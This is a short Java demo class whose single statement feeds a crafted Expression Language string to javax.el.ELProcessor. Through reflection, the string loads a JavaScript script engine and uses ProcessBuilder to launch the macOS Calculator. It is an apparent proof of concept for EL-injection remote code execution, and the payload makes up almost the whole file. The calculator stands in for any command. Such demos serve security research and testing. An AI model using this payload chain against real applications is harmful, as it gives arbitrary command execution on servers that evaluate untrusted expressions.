import javax.el.ELProcessor;

public class ELProcessorDemo {
    public static void main(String[] args) {
        ELProcessor elProcessor = new ELProcessor();
        elProcessor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open','/System/Applications/Calculator.app']).start()\")");
    }
}
